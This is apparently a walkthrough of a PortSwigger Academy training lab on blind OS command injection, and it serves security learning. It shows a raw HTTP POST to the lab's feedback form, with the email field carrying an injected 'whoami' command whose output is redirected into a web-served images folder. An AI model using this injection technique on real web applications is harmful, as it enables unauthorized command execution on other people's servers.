---
title: "PortSwigger Academy — Blind OS command injection with output redirection (Web) Walkthrough"
---
# Blind OS command injection with output redirection

❓ This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:

```txt
/var/www/images/
```

The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

To solve the lab, execute the `whoami` command and retrieve the output.

```bash
POST /feedback/submit HTTP/2
Host: 0a7b00640477651580b2bc9100c9007b.web-security-academy.net
Cookie: session=NX7worZOhtqV1Vc6ss5Obomfyc8733ws
Content-Length: 130
Sec-Ch-Ua-Platform: "macOS"
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Origin: https://0a7b00640477651580b2bc9100c9007b.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a7b00640477651580b2bc9100c9007b.web-security-academy.net/feedback
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Dnt: 1
Sec-Gpc: 1
Priority: u=1, i

csrf=gkEICLFa7FDez9ohU7t5COFbQCzoFLs8&name=test&email=test@mail.com||whoami>/var/www/images/whoami.txt||&subject=test&message=test
```
